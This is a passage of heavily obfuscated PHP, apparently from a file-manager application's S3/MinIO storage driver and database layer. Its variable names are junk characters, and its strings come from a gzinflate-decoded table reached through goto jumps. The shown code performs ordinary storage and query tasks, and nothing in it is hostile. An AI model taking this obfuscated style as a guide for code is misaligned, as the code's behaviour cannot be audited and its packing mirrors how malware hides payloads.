($»ä±‹ÃŠ) { $õÄÜøäµ = array_diff($õÄÜøäµ, array($ÍÚÇğ´)); $õÄÜøäµ = count(array_unique($õÄÜøäµ)); $Ü­¨ğ«Ú = count(array_unique($Ü­¨ğ«Ú)); return array($Í«Á £[203] => $õÄÜøäµ, $Í«Á £[204] => $Ü­¨ğ«Ú); } return !1; } public function listAll($ÁÑé¦™’) { $ùĞ€èàÇ =& $_SERVER[¥ÙÌÜ¾ê]; $ŞŸ³Ğ¬ó = $this->fileList($ÁÑé¦™’, $ùĞ€èàÇ[33], !0); $¿ßÈñ—’ = array(); foreach ($ŞŸ³Ğ¬ó[$ùĞ€èàÇ[74]] as $ƒ¡ÛûóÍ) { $¿ßÈñ—’[$ƒ¡ÛûóÍ[$ùĞ€èàÇ[28]]] = $ƒ¡ÛûóÍ[$ùĞ€èàÇ[78]]; } foreach ($ŞŸ³Ğ¬ó[$ùĞ€èàÇ[75]] as $ƒ¡ÛûóÍ) { if (is_string($ƒ¡ÛûóÍ)) { $¿ßÈñ—’[$ƒ¡ÛûóÍ] = 0; } } return $this->listAllFiles($ÁÑé¦™’, array_keys($¿ßÈñ—’), $¿ßÈñ—’); } public function canRead($ßáš¸ŸÎ) { $¨à¿Ê»¡ =& $_SERVER[¥ÙÌÜ¾ê]; $…‰«ëµÍ = $this->client->getAccessControlPolicy($this->bucket, $ßáš¸ŸÎ); if (!$…‰«ëµÍ) { return !1; } return in_array($…‰«ëµÍ, array($¨à¿Ê»¡[205], $¨à¿Ê»¡[206], $¨à¿Ê»¡[207])) ? !0 : !1; } public function canWrite($Âõ×ç‚¦) { $ÆĞÀö¶Û =& $_SERVER[¥ÙÌÜ¾ê]; $ÕÑ¯ä»ß = $this->client->getAccessControlPolicy($this->bucket, $Âõ×ç‚¦); if (!$ÕÑ¯ä»ß) { return !1; } return in_array($ÕÑ¯ä»ß, array($ÆĞÀö¶Û[205], $ÆĞÀö¶Û[206])) ? !0 : !1; } public function getContent($™‘ÊÛÒû) { return $this->client->getObject($this->bucket, $™‘ÊÛÒû); } public function setContent($«¦ó‘¯´, $öë²©¬è = '', $§Æ“¬µ• = false) { $¶ÌºĞÛ =& $_SERVER[¥ÙÌÜ¾ê]; $«¦ó‘¯´ = $§Æ“¬µ• ? trim($«¦ó‘¯´, $¶ÌºĞÛ[8]) . $¶ÌºĞÛ[8] : $«¦ó‘¯´; $İÔÓ„ªé = get_file_mime(get_path_ext($«¦ó‘¯´)); $å«ò™³è = $this->client->putObject($öë²©¬è, $this->bucket, $«¦ó‘¯´, $¶ÌºĞÛ[192], array(), $İÔÓ„ªé); if (!$å«ò™³è) { return !1; } if ($§Æ“¬µ•) { return !0; } $this->cacheMethod(null, null); $å«ò™³è = $this->copyFile($«¦ó‘¯´, $«¦ó‘¯´, array($¶ÌºĞÛ[208] => $å«ò™³è[$¶ÌºĞÛ[209]])); return $å«ò™³è ? !0 : !1; } public function fileSubstr($şØÅâ›, $Öëúšáù, $­°´¡àÒ) { $´öŒˆãä = $Öëúšáù + $­°´¡àÒ - 1; return $this->client->getObject($this->bucket, $şØÅâ›, array($_SERVER[¥ÙÌÜ¾ê][210] => "\142\171\164\145\x73\x3d{$Öëúšáù}\55{$´öŒˆãä}")); } public function upload($©áŸÀ©±, $ˆêÆŒ³, $üİ€Öã = false, $ùØÂ  = REPEAT_REPLACE) { $¹‹’œùì =& $_SERVER[¥ÙÌÜ¾ê]; $½°»¡é¡ = array($¹‹’œùì[208] => @md5_file($ˆêÆŒ³)); $ ‘¤üË = array($¹‹’œùì[211] => get_file_mime(get_path_ext($©áŸÀ©±))); if (IO::size($ˆêÆŒ³) <= 1024 * 1024 * 200) { $òÎØú›Õ = $this->client->putObjectFile($ˆêÆŒ³, $this->bucket, $©áŸÀ©±, $¹‹’œùì[192], $½°»¡é¡, $ ‘¤üË); return !empty($òÎØú›Õ) ? $this->getPathOuter($©áŸÀ©±) : !1; } $Ø×£ŠÈ = $this->client->multiUploadObject($ˆêÆŒ³, $this->bucket, trim($©áŸÀ©±, $¹‹’œùì[8]), $½°»¡é¡, $ ‘¤üË); return $Ø×£ŠÈ ? $this->getPathOuter($©áŸÀ©±) : !1; } public function download($¶Î¤œÒ®, $á³›¼à) { if (!@is_dir($this->pathFather($á³›¼à)) && !IO::mkdir($this->pathFather($á³›¼à))) { return !1; } $ÆòŞØ¿˜ = $this->client->getObject($this->bucket, $¶Î¤œÒ®, array(), $á³›¼à); return $ÆòŞØ¿˜ !== !1 ? $á³›¼à : !1; } public function link($®ÎÙë¨, $á‰½’¾ = array()) { $œå¬õõï =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->signVer == $œå¬õõï[212]) { return $this->client->getAuthenticatedURL($this->bucket, $®ÎÙë¨, 3600 * 12, $á‰½’¾); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($®ÎÙë¨, $œå¬õõï[8]), 3600 * 12, $this->region, array(), !0, $á‰½’¾); } public function fileOut($Ôú‚¾’², $àÏ°ı’  = false, $„³Š¼ì¸ = false, $šÉİÜå† = '') { $°ı¥Ÿ¥‹ =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->isFileOutServer()) { return $this->fileOutServer($Ôú‚¾’², $àÏ°ı’ , $„³Š¼ì¸, $šÉİÜå†); } if (!$„³Š¼ì¸) { $„³Š¼ì¸ = $this->pathThis($Ôú‚¾’²); } $ÑŸóøŸ = get_file_mime(get_path_ext($„³Š¼ì¸)); if ($ÑŸóøŸ == $°ı¥Ÿ¥‹[213]) { return parent::fileOut($Ôú‚¾’², $àÏ°ı’ , $„³Š¼ì¸, $šÉİÜå†); } $àÏ°ı’  = $àÏ°ı’  ? $°ı¥Ÿ¥‹[214] : $°ı¥Ÿ¥‹[215]; $…Úà»Â = array($°ı¥Ÿ¥‹[216] => $àÏ°ı’  . $°ı¥Ÿ¥‹[217] . rawurlencode($„³Š¼ì¸), $°ı¥Ÿ¥‹[218] => $ÑŸóøŸ); $Î‘Ÿ®ò = $this->link($Ôú‚¾’², $…Úà»Â); $this->fileOutLink($Î‘Ÿ®ò); } public function fileOutServer($®ş×· à, $‘ÖÆ£õ± = false, $û ğí¤¡ = false, $’¥‰Şõ = '') { parent::fileOut($®ş×· à, $‘ÖÆ£õ±, $û ğí¤¡, $’¥‰Şõ); } public function fileOutImageServer($¦èÍ‰ò€, $Ö¥Ñ¥ÓÆ = 250) { parent::fileOutImage($¦èÍ‰ò€, $Ö¥Ñ¥ÓÆ); } public function hashMd5($†“ËİŒ­, $¥ªÂ›ÊÈ = '') { $Ü§òëÛ =& $_SERVER[¥ÙÌÜ¾ê]; $Ãõ¯Çµ— = $this->objectMeta($†“ËİŒ­); if (!$Ãõ¯Çµ—) { return !1; } $¥ªÂ›ÊÈ = $¥ªÂ›ÊÈ ? $¥ªÂ›ÊÈ : _get($Ãõ¯Çµ—, $Ü§òëÛ[219]); $¥ªÂ›ÊÈ = $¥ªÂ›ÊÈ ? $¥ªÂ›ÊÈ : _get($Ãõ¯Çµ—, $Ü§òëÛ[209], $Ü§òëÛ[33]); return $¥ªÂ›ÊÈ; } public function uploadFormData($¢ı¹ÛÌ, $’Êß¬½ = 3600) { $ıõƒ°âğ =& $_SERVER[¥ÙÌÜ¾ê]; $®›ù„ü™ = $this->pathFather($¢ı¹ÛÌ); $™¦¨ì¬ = $this->client->getHttpUploadPostParams($this->bucket, $®›ù„ü™, $ıõƒ°âğ[192], $’Êß¬½); return array_merge((array) $™¦¨ì¬, array($ıõƒ°âğ[175] => $this->getHost())); } public function multiUploadFormData($üœĞÃä‡, $áıÕöÚ  = 3600) { $ûéˆãÃ =& $_SERVER[¥ÙÌÜ¾ê]; $ûğü¬­¿ = gmdate($ûéˆãÃ[220]); $‘ú¨¶Ü• = array(); $÷ßòÛ³ø = $this->client->getUploadId($this->bucket, $üœĞÃä‡, $‘ú¨¶Ü•); if (!$÷ßòÛ³ø) { return !1; } return array($ûéˆãÃ[221] => $÷ßòÛ³ø, $ûéˆãÃ[175] => $this->getHost() . $ûéˆãÃ[8] . $this->pathEncode($üœĞÃä‡), $ûéˆãÃ[222] => $ûğü¬­¿, $ûéˆãÃ[93] => $üœĞÃä‡); } public function multiUploadAuthData($¶²Â…™, $é¿–ô³¿ = array()) { $œ–Ø’»õ =& $_SERVER[¥ÙÌÜ¾ê]; $êû¡—Ò = isset($é¿–ô³¿[$œ–Ø’»õ[222]]) ? $é¿–ô³¿[$œ–Ø’»õ[222]] : gmdate($œ–Ø’»õ[220]); $ĞƒêØÒ = isset($é¿–ô³¿[$œ–Ø’»õ[168]]) ? $é¿–ô³¿[$œ–Ø’»õ[168]] : $œ–Ø’»õ[33]; $ô«šÒ² = $é¿–ô³¿[$œ–Ø’»õ[93]]; unset($é¿–ô³¿[$œ–Ø’»õ[93]]); if (isset($é¿–ô³¿[$œ–Ø’»õ[223]])) { $é¿–ô³¿[$œ–Ø’»õ[222]] = $êû¡—Ò; return $this->listUploadParts($ô«šÒ², $é¿–ô³¿); } $à”»í‡ = array($œ–Ø’»õ[224], $œ–Ø’»õ[33], $œ–Ø’»õ[119], $œ–Ø’»õ[33], "\170\x2d\141\x6d\x7a\x2d\144\x61\x74\145\x3a{$êû¡—Ò}", $œ–Ø’»õ[8] . $this->bucket . $œ–Ø’»õ[8] . $this->pathEncode($ô«šÒ²) . $ĞƒêØÒ); if (strpos($ĞƒêØÒ, $œ–Ø’»õ[225]) === 0) { $à”»í‡[0] = $œ–Ø’»õ[226]; } if (isset($é¿–ô³¿[$œ–Ø’»õ[227]]) && $é¿–ô³¿[$œ–Ø’»õ[227]] == $œ–Ø’»õ[228]) { $à”»í‡[0] = $œ–Ø’»õ[228]; } $Ïƒ¼û‹ = implode($œ–Ø’»õ[229], $à”»í‡); $‡ •­‹ı = base64_encode(hash_hmac($œ–Ø’»õ[230], $Ïƒ¼û‹, $this->secret, !0)); $¹ ™Æ‡ = $œ–Ø’»õ[231] . $this->accessKey . $œ–Ø’»õ[4] . $‡ •­‹ı; if (strpos($ĞƒêØÒ, $œ–Ø’»õ[225]) === 0) { return array($œ–Ø’»õ[232] => $¹ ™Æ‡, $œ–Ø’»õ[222] => $êû¡—Ò); } return $¹ ™Æ‡; } public function listUploadParts($ĞóÄœœŠ, $õÀãòÓŠ = array()) { $ø’¾¨Í¦ =& $_SERVER[¥ÙÌÜ¾ê]; $¿Ï¾É²â = str_replace($ø’¾¨Í¦[233], $ø’¾¨Í¦[33], $õÀãòÓŠ[$ø’¾¨Í¦[168]]); $¶“Á§üñ = $this->client->listParts($this->bucket, $ĞóÄœœŠ, $¿Ï¾É²â); if (!$¶“Á§üñ) { return !1; } unset($õÀãòÓŠ[$ø’¾¨Í¦[223]], $õÀãòÓŠ[$ø’¾¨Í¦[227]]); $õÀãòÓŠ[$ø’¾¨Í¦[93]] = $ĞóÄœœŠ; $ ªŞÚŒ = $this->multiUploadAuthData($ĞóÄœœŠ, $õÀãòÓŠ); if (empty($ ªŞÚŒ)) { return !1; } return array($ø’¾¨Í¦[232] => $ ªŞÚŒ, $ø’¾¨Í¦[222] => $õÀãòÓŠ[$ø’¾¨Í¦[222]], $ø’¾¨Í¦[234] => $¶“Á§üñ); } public function getHost() { return parent::getHost() . $_SERVER[¥ÙÌÜ¾ê][8] . $this->bucket; } public function size($Óç×ÍÜ) { $ŸË„±õ = $this->objectMeta($Óç×ÍÜ); return $ŸË„±õ ? $ŸË„±õ[$_SERVER[¥ÙÌÜ¾ê][78]] : 0; } public function info($–èİ¦óÀ) { if ($this->isFolder($–èİ¦óÀ)) { return $this->folderInfo($–èİ¦óÀ); } else { if ($this->isFile($–èİ¦óÀ)) { return $this->fileInfo($–èİ¦óÀ); } } return !1; } public function exist($çæÉ¹°²) { return $this->isFile($çæÉ¹°²) || $this->isFolder($çæÉ¹°²); } public function isFile($“÷°¾â) { return !$this->isFolder($“÷°¾â) && $this->objectMeta($“÷°¾â); } public function isFolder($ş÷¶éÖª) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][199], $ş÷¶éÖª); } protected function objectMeta($ÔŸÂÍÅ) { return $this->cacheMethod($_SERVER[¥ÙÌÜ¾ê][200], $ÔŸÂÍÅ); } protected function _objectMeta($óı¿ïÀÙ) { $à„‡Œù¢ =& $_SERVER[¥ÙÌÜ¾ê]; $óı¿ïÀÙ = rtrim($óı¿ïÀÙ, $à„‡Œù¢[8]); try { $¸ŸáŒá = $this->client->getObjectInfo($this->bucket, $óı¿ïÀÙ); if (!isset($¸ŸáŒá[$à„‡Œù¢[219]]) && isset($¸ŸáŒá[$à„‡Œù¢[235]])) { $¸ŸáŒá[$à„‡Œù¢[219]] = $¸ŸáŒá[$à„‡Œù¢[235]]; } } catch (Exception $‹ú¡ğ’) { $¸ŸáŒá = !1; } if (!$¸ŸáŒá) { } return $¸ŸáŒá; } protected function _isFolder($÷×Ÿ“´†) { $¢À×ÓÄÈ =& $_SERVER[¥ÙÌÜ¾ê]; $÷×Ÿ“´† = rtrim($÷×Ÿ“´†, $¢À×ÓÄÈ[8]); if ($÷×Ÿ“´† == $¢À×ÓÄÈ[33] || $÷×Ÿ“´† == $¢À×ÓÄÈ[8]) { return !0; } $†š£ŒÚÆ = $this->client->getBucket($this->bucket, $÷×Ÿ“´†, null, 1); if (empty($†š£ŒÚÆ[$¢À×ÓÄÈ[198]])) { return !1; } $¶¾‡ûÁÊ = $†š£ŒÚÆ[$¢À×ÓÄÈ[198]][0][$¢À×ÓÄÈ[28]]; return stripos($¶¾‡ûÁÊ, $÷×Ÿ“´† . $¢À×ÓÄÈ[8]) === 0 ? !0 : !1; if (substr($¶¾‡ûÁÊ, -1) == $¢À×ÓÄÈ[8]) { return !0; } if (get_path_this($¶¾‡ûÁÊ) == get_path_this($÷×Ÿ“´†)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($’ñäªø) { parent::__construct($’ñäªø); $this->signatureVersion($_SERVER[¥ÙÌÜ¾ê][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto d¢­¹¯œ·å; d……ãÈˆ×¾: define($_SERVER[¥ÙÌÜ¾ê][0], $_SERVER[¥ÙÌÜ¾ê][1]); $_SERVER[ïš¡îä™] = explode($_SERVER[¥ÙÌÜ¾ê][2], gzinflate(substr($_SERVER[¥ÙÌÜ¾ê][3], 10, -8))); function binCheckEq($†Úğ„ŞÌ, $”Šİ™®) { return $†Úğ„ŞÌ == $”Šİ™®; } goto E¦„ø‰áÎ; b¥Ç×ò‘: class DbSqlite3 extends DbSqlite3Base { public function query($»—¾¿èğ) { $ë¥³ì´¼ =& $_SERVER[¥ÙÌÜ¾ê]; if (!CacheLock::fileLock($ë¥³ì´¼[9])) { return !1; } $ÛÔÙ¨¦Š = parent::query($»—¾¿èğ); CacheLock::fileUnLock($ë¥³ì´¼[9]); return $ÛÔÙ¨¦Š; } public function execute($—‹£®æô) { $¯÷òŒÃè =& $_SERVER[¥ÙÌÜ¾ê]; if (!CacheLock::fileLock($¯÷òŒÃè[9])) { return !1; } $şñº´şá = parent::execute($—‹£®æô); CacheLock::fileUnLock($¯÷òŒÃè[9]); return $şñº´şá; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\x65\161" => "\x3c\x3e", "\147\164" => "\x3e", "\145\147\164" => "\x3e\75", "\x6c\x74" => "\74", "\145\154\164" => "\x3c\75", "\156\157\164\154\151\x6b\x65" => "\116\x4f\x54\40\x4c\x49\x4b\105", "\154\x69\153\145" => "\x4c\x49\x4b\x45", "\x69\156" => "\x49\116", "\x6e\x6f\164\x69\156" => "\116\117\124\x20\111\x4e", "\156\x6f\164\40\151\156" => "\116\x4f\x54\x20\111\x4e", "\142\x65\x74\167\x65\x65\x6e" => "\x42\105\124\127\105\x45\x4e", "\x6e\157\x74\142\145\x74\x77\x65\145\x6e" => "\116\117\x54\40\x42\x45\124\x57\x45\x45\116", "\156\x6f\x74\x20\142\145\164\x77\x65\x65\156" => "\x4e\x4f\x54\x20\102\x45\x54\127\105\x45\116"); protected $selectSql = "\x53\x45\114\x45\103\124\x25\104\111\123\x54\111\x4e\x43\x54\45\x20\45\x46\x49\x45\x4c\104\45\40\x46\122\117\x4d\x20\x25\124\x41\x42\114\x45\x25\45\112\117\x49\x4e\45\x25\127\x48\105\x52\105\45\x25\107\x52\117\x55\120\45\45\110\101\x56\x49\116\107\x25\x25\117\x52\104\105\122\x25\45\x4c\x49\115\x49\124\x25\x20\x25\x55\x4e\x49\117\116\x25\45\x43\x4f\115\x4d\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $âÏÛ´ôÕ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¥ÙÌÜ¾ê][958], $âÏÛ´ôÕ); } public function factory($ÇÏçëØ­ = '') { $Õ‘‹‚Üù =& $_SERVER[¥ÙÌÜ¾ê]; $ÇÏçëØ­ = $this->parseConfig($ÇÏçëØ­); if (empty($ÇÏçëØ­[$Õ‘‹‚Üù[959]])) { think_exception(think_lang($Õ‘‹‚Üù[960])); } $this->dbType = ucwords(strtolower($ÇÏçëØ­[$Õ‘‹‚Üù[959]])); $¡£¸ÔÎ” = $Õ‘‹‚Üù[961] . $this->dbType; if (class_exists($¡£¸ÔÎ”)) { $ßŒ“¤¡¥ = new $¡£¸ÔÎ”($ÇÏçëØ­); if ($Õ‘‹‚Üù[790] != strtolower($ÇÏçëØ­[$Õ‘‹‚Üù[959]])) { $ßŒ“¤¡¥->dbType = strtoupper($this->dbType); } else { $ßŒ“¤¡¥->dbType = $this->_getDsnType($ÇÏçëØ­[$Õ‘‹‚Üù[914]]); } } else { think_exception(think_lang($Õ‘‹‚Üù[962]) . $Õ‘‹‚Üù[963] . $¡£¸ÔÎ”); } return $ßŒ“¤¡¥; } public function __call($Â‚õ°™Ç, $ø…íå“Ô) { if (method_exists($this, $Â‚õ°™Ç)) { return call_user_func_array(array($this, $Â‚õ°™Ç), $ø…íå“Ô); } } protected function _getDsnType($×òÔ÷¸ï) { $Ä§‘å¥Ö = explode($_SERVER[¥ÙÌÜ¾ê][4], $×òÔ÷¸ï); $ãş§Àğş = strtoupper(trim($Ä§‘å¥Ö[0])); return $ãş§Àğş; } private function parseConfig($”İ¬âñ» = '') { $Æ…°ìÊ =& $_SERVER[¥ÙÌÜ¾ê]; if (!empty($”İ¬âñ») && is_string($”İ¬âñ»)) { $”İ¬âñ» = $this->parseDSN($”İ¬âñ»); } elseif (is_array($”İ¬âñ»)) { $”İ¬âñ» = array_change_key_case($”İ¬âñ»); $”İ¬âñ» = array($Æ…°ìÊ[959] => $”İ¬âñ»[$Æ…°ìÊ[789]], $Æ…°ìÊ[887] => $”İ¬âñ»[$Æ…°ìÊ[964]], $Æ…°ìÊ[888] => $”İ¬âñ»[$Æ…°ìÊ[965]], $Æ…°ìÊ[885] => $”İ¬âñ»[$Æ…°ìÊ[966]], $Æ…°ìÊ[886] => $”İ¬âñ»[$Æ…°ìÊ[967]], $Æ…°ìÊ[17] => $”İ¬âñ»[$Æ…°ìÊ[968]], $Æ…°ìÊ[914] => $”İ¬âñ»[$Æ…°ìÊ[791]], $Æ…°ìÊ[13] => isset($”İ¬âñ»[$Æ…°ìÊ[969]]) ? $”İ¬âñ»[$Æ…°ìÊ[969]] : array()); } elseif (empty($”İ¬âñ»)) { if (think_config($Æ…°ìÊ[970]) && $Æ…°ìÊ[790] != strtolower(think_config($Æ…°ìÊ[971]))) { $”İ¬âñ» = $this->parseDSN(think_config($Æ…°ìÊ[970])); } else { $”İ¬âñ» = array($Æ…°ìÊ[959] => think_config($Æ…°ìÊ[971]), $Æ…°ìÊ[887] => think_config($Æ…°ìÊ[972]), $Æ…°ìÊ[888] => think_config($Æ…°ìÊ[973]), $Æ…°ìÊ[885] => think_config($Æ…°ìÊ[974]), $Æ…°ìÊ[886] => think_config($Æ…°ìÊ[975]), $Æ…°ìÊ[17] => think_config($Æ…°ìÊ[244]), $Æ…°ìÊ[914] => think_config($Æ…°ìÊ[970]), $Æ…°ìÊ[13] => think_config($Æ…°ìÊ[976])); } } return $”İ¬âñ»; } protected function initConnect($öÆÈÉ­µ = true) { if (1 == think_config($_SERVER[¥ÙÌÜ¾ê][18])) { $this->_linkID = $this->multiConnect($öÆÈÉ­µ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $†öÕğÕ => $Ó„é…ë) { $this->_linkID = $Ó„é…ë; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ŸîÃ§Áè = false) { $ƒ¨áòºİ =& $_SERVER[¥ÙÌÜ¾ê]; static $³Òâ÷À = array(); static $¹ªèİ· = -1; if (empty($³Òâ÷À)) { foreach ($this->config as $¶İ•Çû¦ => $²³ÕÒ¬¾) { $³Òâ÷À[$¶İ•Çû¦] = explode($ƒ¨áòºİ[47], $²³ÕÒ¬¾); } } if (think_config($ƒ¨áòºİ[977])) { if ($ŸîÃ§Áè || think_config($ƒ¨áòºİ[391]) === !0) { $³÷®Ã«™ = floor(mt_rand(0, think_config($ƒ¨áòºİ[978]) - 1)); $¹ªèİ· = $³÷®Ã«™; } else { if (is_numeric(think_config($ƒ¨áòºİ[979]))) { $³÷®Ã«™ = think_config($ƒ¨áòºİ[979]); } else { $³÷®Ã«™ = floor(mt_rand(think_config($ƒ¨áòºİ[978]), count($³Òâ÷À[$ƒ¨áòºİ[885]]) - 1)); } } } else { $³÷®Ã«™ = floor(mt_rand(0, count($³Òâ÷À[$ƒ¨áòºİ[885]]) - 1)); $¹ªèİ· = $³÷®Ã«™; } $³÷®Ã«™ = $¹ªèİ· !== -1 ? $¹ªèİ· : $³÷®Ã«™; $“×ğŒÒò = array($ƒ¨áòºİ[887] => isset($³Òâ÷À[$ƒ¨áòºİ[887]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[887]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[887]][0], $ƒ¨áòºİ[888] => isset($³Òâ÷À[$ƒ¨áòºİ[888]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[888]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[888]][0], $ƒ¨áòºİ[885] => isset($³Òâ÷À[$ƒ¨áòºİ[885]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[885]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[885]][0], $ƒ¨áòºİ[886] => isset($³Òâ÷À[$ƒ¨áòºİ[886]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[886]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[886]][0], $ƒ¨áòºİ[17] => isset($³Òâ÷À[$ƒ¨áòºİ[17]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[17]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[17]][0], $ƒ¨áòºİ[914] => isset($³Òâ÷À[$ƒ¨áòºİ[914]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[914]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[914]][0], $ƒ¨áòºİ[13] => isset($³Òâ÷À[$ƒ¨áòºİ[13]][$³÷®Ã«™]) ? $³Òâ÷À[$ƒ¨áòºİ[13]][$³÷®Ã«™] : $³Òâ÷À[$ƒ¨áòºİ[13]][0]); return $this->connect($“×ğŒÒò, $³÷®Ã«™); } public function parseDSN($åÔĞšÂÃ) { $‘Ä ¦‰  =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($åÔĞšÂÃ)) { return !1; } $Ä» åóÑ = parse_url($åÔĞšÂÃ); if ($Ä» åóÑ[$‘Ä ¦‰ [174]]) { $±Ï“À¬ = array($‘Ä ¦‰ [959] => $Ä» åóÑ[$‘Ä ¦‰ [174]], $‘Ä ¦‰ [887] => isset($Ä» åóÑ[$‘Ä ¦‰ [588]]) ? $Ä» åóÑ[$‘Ä ¦‰ [588]] : $‘Ä ¦‰ [33], $‘Ä ¦‰ [888] => isset($Ä» åóÑ[$‘Ä ¦‰ [980]]) ? $Ä» åóÑ[$‘Ä ¦‰ [980]] : $‘Ä ¦‰ [33], $‘Ä ¦‰ [885] => isset($Ä» åóÑ[$‘Ä ¦‰ [175]]) ? $Ä» åóÑ[$‘Ä ¦‰ [175]] : $‘Ä ¦‰ [33], $‘Ä ¦‰ [886] => isset($Ä» åóÑ[$‘Ä ¦‰ [176]]) ? $Ä» åóÑ[$‘Ä ¦‰ [176]] : $‘Ä ¦‰ [33], $‘Ä ¦‰ [17] => isset($Ä» åóÑ[$‘Ä ¦‰ [76]]) ? substr($Ä» åóÑ[$‘Ä ¦‰ [76]], 1) : $‘Ä ¦‰ [33]); } else { preg_match($‘Ä ¦‰ [981], trim($åÔĞšÂÃ), $¬ùÊÁ¬ä); $±Ï“À¬ = array($‘Ä ¦‰ [959] => $¬ùÊÁ¬ä[1], $‘Ä ¦‰ [887] => $¬ùÊÁ¬ä[2], $‘Ä ¦‰ [888] => $¬ùÊÁ¬ä[3], $‘Ä ¦‰ [885] => $¬ùÊÁ¬ä[4], $‘Ä ¦‰ [886] => $¬ùÊÁ¬ä[5], $‘Ä ¦‰ [17] => $¬ùÊÁ¬ä[6]); } $±Ï“À¬[$‘Ä ¦‰ [914]] = $‘Ä ¦‰ [33]; return $±Ï“À¬; } protected function debug() { $×ª”¦Öé =& $_SERVER[¥ÙÌÜ¾ê]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $×ª”¦Öé[982]; if (think_config($×ª”¦Öé[983])) { think_status($×ª”¦Öé[984]); think_trace($this->queryStr . $×ª”¦Öé[985] . think_status($×ª”¦Öé[20], $×ª”¦Öé[984], 6) . $×ª”¦Öé[986], $×ª”¦Öé[33], $×ª”¦Öé[987]); } } protected function parseLock($ª«ĞÓ = false) { $ÖÛİ¼µ„ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$ª«ĞÓ) { return $ÖÛİ¼µ„[33]; } if ($ÖÛİ¼µ„[916] == $this->dbType) { return $ÖÛİ¼µ„[988]; } return $ÖÛİ¼µ„[989]; } protected function parseSet($œıÍôûı) { $ºø¿Â¿ =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($œıÍôûı as $•¶ß˜Š => $û¾Ö†à˜) { if (is_array($û¾Ö†à˜) && $ºø¿Â¿[295] == $û¾Ö†à˜[0]) { $œãì‹¤[] = $this->parseKey($•¶ß˜Š) . $ºø¿Â¿[990] . $û¾Ö†à˜[1]; } elseif (is_scalar($û¾Ö†à˜) || is_null($û¾Ö†à˜)) { $œãì‹¤[] = $this->parseKey($•¶ß˜Š) . $ºø¿Â¿[990] . $this->parseValue($û¾Ö†à˜); } } return $ºø¿Â¿[991] . implode($ºø¿Â¿[47], $œãì‹¤); } protected function bindParam($–Èäºû÷, $ñÌÇúÁ) { $this->bind[$_SERVER[¥ÙÌÜ¾ê][4] . $–Èäºû÷] = $ñÌÇúÁ; } protected function parseBind($ÀÕù£ê•) { $ÀÕù£ê• = array_merge($this->bind, $ÀÕù£ê•); $this->bind = array(); return $ÀÕù£ê•; } function parseKey(&$¿ì—¨—», $ÁƒáÀ¥À = true) { if ($ÁƒáÀ¥À) { $¿ì—¨—» = $this->parseKeyCheck($¿ì—¨—»); } return $¿ì—¨—»; } function parseKeyCheck($«Ôá»Ğ¦) { $ÅıÓşòÁ =& $_SERVER[¥ÙÌÜ¾ê]; $«Ôá»Ğ¦ = trim($«Ôá»Ğ¦); if (!preg_match($ÅıÓşòÁ[992], $«Ôá»Ğ¦)) { think_exception($ÅıÓşòÁ[993] . $«Ôá»Ğ¦); } return $«Ôá»Ğ¦; } protected function parseValue($Š“¨“Õ‹) { $çô¡¡» =& $_SERVER[¥ÙÌÜ¾ê]; if (is_string($Š“¨“Õ‹)) { $Š“¨“Õ‹ = $çô¡¡»[955] . $this->escapeString($Š“¨“Õ‹) . $çô¡¡»[955]; } elseif (isset($Š“¨“Õ‹[0]) && is_string($Š“¨“Õ‹[0]) && strtolower($Š“¨“Õ‹[0]) == $çô¡¡»[295]) { $Š“¨“Õ‹ = $this->escapeString($Š“¨“Õ‹[1]); } elseif (is_array($Š“¨“Õ‹)) { $Š“¨“Õ‹ = array_map(array($this, $çô¡¡»[956]), $Š“¨“Õ‹); } elseif (is_bool($Š“¨“Õ‹)) { $Š“¨“Õ‹ = $Š“¨“Õ‹ ? $çô¡¡»[87] : $çô¡¡»[191]; } elseif (is_null($Š“¨“Õ‹)) { $Š“¨“Õ‹ = $çô¡¡»[103]; } return $Š“¨“Õ‹; } protected function parseField($Œ¢Ì­ë’) { $Ñ±ˆíıÙ =& $_SERVER[¥ÙÌÜ¾ê]; if (is_string($Œ¢Ì­ë’) && strpos($Œ¢Ì­ë’, $Ñ±ˆíıÙ[47])) { $Œ¢Ì­ë’ = explode($Ñ±ˆíıÙ[47], $Œ¢Ì­ë’); } if (is_array($Œ¢Ì­ë’)) { $¸íªÖîà = array(); foreach ($Œ¢Ì­ë’ as $âø¬È¹ => $ÙáÑ×ğ) { if 